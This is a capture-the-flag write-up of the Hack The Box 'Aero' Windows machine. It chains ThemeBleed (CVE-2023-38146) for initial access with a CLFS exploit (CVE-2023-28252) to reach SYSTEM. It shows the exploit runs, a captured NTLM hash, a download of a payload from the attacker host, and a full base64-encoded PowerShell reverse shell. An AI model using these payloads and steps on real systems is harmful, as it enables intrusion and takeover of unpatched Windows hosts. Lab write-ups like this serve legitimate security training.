---
title: "Aero HTB Writeup"
date: 2025-07-28T14:00:00+00:00
description: "Aero is a medium-difficulty Windows machine featuring two recent CVEs: CVE-2023-38146, affecting Windows 11 themes, and CVE-2023-28252, targeting the Common Log File System (CLFS). Initial access is achieved through the crafting of a malicious payload using the ThemeBleed proof-of-concept, resulting in a reverse shell. Upon gaining a foothold, a CVE disclosure notice is found in the user's home directory, indicating vulnerability to CVE-2023-28252. Modification of an existing proof-of-concept is required to facilitate privilege escalation to administrator level or code execution as NT Authority/SYSTEM."
tags: ["ethical hacking", "tools", "intermediate", "windows", "CVE"]
categories: ["writeups", "HTB", "Boxes", "Windows"]
author: "Anirudh Ajithkumar"
showToc: true
TocOpen: true
draft: false
---

# Aero HTB Writeup

Initially we start off this box by doing an nmap scan. And we get the following results

```bash
┌──(kali㉿kali)-[~/HTB/Aero]
└─$ sudo nmap -sC -sV -T5 -p- -A --open 10.129.223.36 | tee nmap
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 12:43 IST
Nmap scan report for 10.129.223.36
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Aero Theme Hub
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11 (88%)
Aggressive OS guesses: Microsoft Windows 11 21H2 (88%)

```

From the above nmap scan , we can see that there is a web site running on the machine at port 80. Lets check it out

When we visit the website we are greeted with the following home page

![image1.png](/assets/images/aero/image1.png)

The website is a repository to upload our custom Windows 11 themes. We can run dirsearch to see if there are any hidden directories

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Aero/reports/http_10.129.223.36/__24-07-03_12-58-50.txt

Target: http://10.129.223.36/

[12:58:50] Starting:
[12:58:53] 403 -  312B  - /%2e%2e//google.com
[12:58:53] 404 -    1KB - /+CSCOT+/oem
[12:58:53] 404 -    1KB - /+CSCOE+/logon.html
[12:58:53] 404 -    1KB - /+CSCOE+/session_password.html
[12:58:53] 404 -    1KB - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
[12:58:53] 404 -    1KB - /+CSCOT+/translation
[12:58:53] 404 -    1KB - /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
[12:58:53] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[12:58:55] 404 -    1KB - /.config/psi+/profiles/default/accounts.xml
[12:59:07] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[12:59:30] 404 -    1KB - /bitrix/web.config
[12:59:32] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[12:59:34] 404 -    1KB - /cms/Web.config
[12:59:45] 404 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[12:59:47] 200 -    5KB - /favicon.ico
[12:59:55] 404 -    1KB - /lang/web.config
[13:00:02] 404 -    1KB - /modules/web.config
[13:00:10] 404 -    1KB - /plugins/web.config
[13:00:26] 404 -    1KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt.sql
[13:00:26] 404 -    1KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt-orig.sql
[13:00:26] 405 -    0B  - /Upload
[13:00:26] 405 -    0B  - /upload
[13:00:26] 405 -    0B  - /upload/
[13:00:30] 404 -    1KB - /web.config

Task Completed
```

We see that there are no sub-directories to explore. There are also no subdomains as well

We can now focus on the uploading themes part

![image2.png](/assets/images/aero/image2.png)

We know that we can upload windows 11 theme to the server. Lets see if we can find any vulnerabilities or exploits. A simple google search yields us the following results

![image3.png](/assets/images/aero/image3.png)

Hmm .. all our search results are populated mostly by the ThemeBleed vulnerability (CVE-2023-38146). Lets see what it does

```
When an unpatched Windows 11 host loads a theme file referencing an msstyles file,
Windows loads the msstyles file, and if that file's PACKME_VERSION is 999, it then
attempts to load an accompanying dll file ending in _vrf.dll Before loading that file,
it verifies that the file is signed. It does this by opening the file for reading and
verifying the signature before opening the file for execution. Because this action is
performed in two discrete operations, it opens the procedure for a time of check to
time of use vulnerability. By embedding a UNC file path to an SMB server we control,
the SMB server can serve a legitimate, signed dll when queried for the read, but then
serve a different file of the same name when the host intends to load/execute the dll.
```

Source : https://packetstormsecurity.com/files/176391/Themebleed-Windows-11-Themes-Arbitrary-Code-Execution.html

In simplified words , we use Time of Check to Time of Use (TOCTOU) Vulnerability to exploit the target. There is a huge time gap between the verification of the dll and the execution of it. So we exploit this narrow time gap to exploit the machine

So in the first phase we can pass a legitimate dll for verification and then for execution we can send a malicious dll for execution , thereby gaining an RCE in the target system

We now check for PoC’s and we find this github repo : https://github.com/Jnnshschl/CVE-2023-38146

We install all the requirements and fire the exploit.

To deliver the payload , the script starts an SMB server

```bash
┌──(kali㉿kali)-[~/HTB/Aero/CVE-2023-38146]
└─$ python3 themebleed.py -r 10.10.14.9 -p 9999
2024-07-03 13:39:09,543 INFO> ThemeBleed CVE-2023-38146 PoC [https://github.com/Jnnshschl]
2024-07-03 13:39:09,543 INFO> Credits to -> https://github.com/gabe-k/themebleed, impacket and cabarchive

2024-07-03 13:39:11,087 INFO> Theme generated: "evil_theme.theme"
2024-07-03 13:39:11,087 INFO> Themepack generated: "evil_theme.themepack"

2024-07-03 13:39:11,087 INFO> Remember to start netcat: rlwrap -cAr nc -lvnp 9999
2024-07-03 13:39:11,087 INFO> Starting SMB server: 10.10.14.9:445

2024-07-03 13:39:11,087 INFO> Config file parsed
2024-07-03 13:39:11,087 INFO> Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2024-07-03 13:39:11,088 INFO> Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2024-07-03 13:39:11,088 INFO> Config file parsed
2024-07-03 13:39:11,088 INFO> Config file parsed

```

We also start a listener at port 9999. Now we upload the "evil_theme.theme" file and hopefully get a callback from the machine

Upon uploading the file , we see that there is a request for the the dlls

```bash
2024-07-03 15:08:44,932 INFO> Incoming connection (10.129.222.250,50623)
2024-07-03 15:08:45,294 INFO> AUTHENTICATE_MESSAGE (AERO\sam.emerson,AERO)
2024-07-03 15:08:45,294 INFO> User AERO\sam.emerson authenticated successfully
2024-07-03 15:08:45,294 INFO> sam.emerson::AERO:aaaaaaaaaaaaaaaa:d5051f01669b6ef1788c0328bd40d9c3:0101000000000000804042cc2ccdda01333ab5323897351d0000000001001000770074006100670055006100640048000300100077007400610067005500610064004800020010004c0079006d0051004500520079004d00040010004c0079006d0051004500520079004d0007000800804042cc2ccdda0106000400020000000800300030000000000000000000000000200000069923f1de1a6c251facaedeb967ea1813524f0afa1d512f7edbd31329d351940a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
2024-07-03 15:08:45,466 INFO> Connecting Share(1:IPC$)
2024-07-03 15:08:45,808 INFO> Connecting Share(2:tb)
2024-07-03 15:08:45,981 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 1]
2024-07-03 15:08:47,568 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 1]
2024-07-03 15:08:49,116 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 7]
2024-07-03 15:08:49,810 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 5]
2024-07-03 15:08:52,242 WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 7]
2024-07-03 15:08:53,921 WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 1]
2024-07-03 15:08:57,449 INFO> Disconnecting Share(1:IPC$)
2024-07-03 15:08:58,837 WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 7]
2024-07-03 15:08:59,526 WARNING> Stage 3/3: "Aero.msstyles_vrf.dll" [shareAccess: 5]
```

Now lets check our reverse shell. Bingo .. we got a call back

```bash
┌──(kali㉿kali)-[~/HTB/Aero]
└─$ rlwrap -cAr nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.223.36] 50624
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```

User flag is in the C:\Users\sam.emerson\Desktop folder

Now upon simple enumeration we come across a few files in the Documents folder of the same user

```bash
PS C:\Users\sam.emerson\Documents> dir
dir

    Directory: C:\Users\sam.emerson\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2023   9:18 AM          14158 CVE-2023-28252_Summary.pdf
-a----         9/26/2023   1:06 PM           1113 watchdog.ps1
```

The watchdog.ps1 file is responsible for executing the malicious themes we upload

Then there is a pdf file. The title gives us a clue regarding the vulnerability we need to exploit to gain administrative access. Lets exfiltrate the file , by converting it into base64

The file content

![image4.png](/assets/images/aero/image4.png)

Hmm .. A privilege escalation vulnerability. Lets search in google for more information regarding the CVE

We come across this Github repo that explains the vulnerability in great detail : https://github.com/fortra/CVE-2023-28252.

Unfortunately this PoC didnt work for me.. so i searched for other PoC’s and found a pre compiled binary , which worked like a charm

Link to the repo : https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252

We can upload the binary from out machine using a python server and download it in the following way

```bash
PS C:\Users\sam.emerson\Documents> iwr http://10.10.14.9:9797/clfs_eop.exe -outfile clfs_eop.exe
```

The binary expects us to pass a command to execute , so I passed a powershell base64 encoded reverse shell. (port 9988)

```bash
PS C:\Users\sam.emerson\Documents> .\clfs_eop.exe "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwAOQA5ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
.\clfs_eop.exe "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwAOQA5ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
[+] Incorrect number of arguments ... using default value 1208 and flag 1 for w11 and w10

ARGUMENTS
[+] TOKEN OFFSET 4b8
[+] FLAG 1

VIRTUAL ADDRESSES AND OFFSETS
[+] NtFsControlFile Address --> 00007FF8F2684240
[+] pool NpAt VirtualAddress -->FFFFE68A3893D000
[+] MY EPROCESSS FFFFBF0AC65E9180
[+] SYSTEM EPROCESSS FFFFBF0AC14CE040
[+] _ETHREAD ADDRESS FFFFBF0AC65EA080
[+] PREVIOUS MODE ADDRESS FFFFBF0AC65EA2B2
[+] Offset ClfsEarlierLsn --------------------------> 0000000000013220
[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> 000000000002BFB0
[+] Kernel ClfsEarlierLsn --------------------------> FFFFF80029613220
[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> FFFFF8002962BFB0
[+] Offset RtlClearBit --------------------------> 0000000000343010
[+] Offset PoFxProcessorNotification --------------------------> 00000000003DBD00
[+] Offset SeSetAccessStateGenericMapping --------------------------> 00000000009C87B0
[+] Kernel RtlClearBit --------------------------> FFFFF80024D43010
[+] Kernel SeSetAccessStateGenericMapping --------------------------> FFFFF800253C87B0

[+] Kernel PoFxProcessorNotification --------------------------> FFFFF80024DDBD00

PATHS
[+] Folder Public Path = C:\Users\Public
[+] Base log file name path= LOG:C:\Users\Public\20
[+] Base file path = C:\Users\Public\20.blf
[+] Container file name path = C:\Users\Public\.p_20
Last kernel CLFS address = FFFFE68A39D87000
numero de tags CLFS founded 11

Last kernel CLFS address = FFFFE68A3A542000
numero de tags CLFS founded 1

[+] Log file handle: 00000000000000EC
[+] Pool CLFS kernel address: FFFFE68A3A542000

number of pipes created =5000

number of pipes created =4000
TRIGGER START
System_token_value: FFFFE68A33041596
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM
#< CLIXML

```

And yes we get a call back

```bash
┌──(kali㉿kali)-[~/HTB/Aero]
└─$ rlwrap -cAr nc -lvnp 9988
listening on [any] 9988 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.223.36] 65382
whoami
nt authority\system
PS C:\Users\sam.emerson\Documents>
```

The root flag can be found in the Administrators Desktop
